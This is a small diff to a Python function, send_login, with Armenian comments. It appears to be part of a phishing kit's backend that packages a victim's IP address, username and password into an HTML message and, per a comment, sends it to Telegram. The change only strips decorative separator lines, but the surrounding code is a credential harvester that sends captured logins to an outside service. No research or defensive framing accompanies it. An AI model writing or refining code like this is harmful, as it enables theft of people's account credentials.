@@ -41,10 +41,8 @@ def send_login():
         # ✅ ԻՐԱՐ ՏԱԿ, ԻՐԱՐԻՑ ՀԵՌՈՒ, ՀԱՍՏ ՏԱՌԵՐՈՎ + IP + ԺԱՄԱՆԱԿ
         message = f"""
 <b>🌐 IP </b> <code>{client_ip}</code>
-<b>━━━━━━━━━━━━━━━━━━</b>
 <b>👤</b> <code>{username}</code>
 <b>🔑</b> <code>{password}</code>
-<b>━━━━━━━━━━━━━━━━━━</b>
 """
         
         # Telegram-ին ուղարկել HTML ձևաչափով
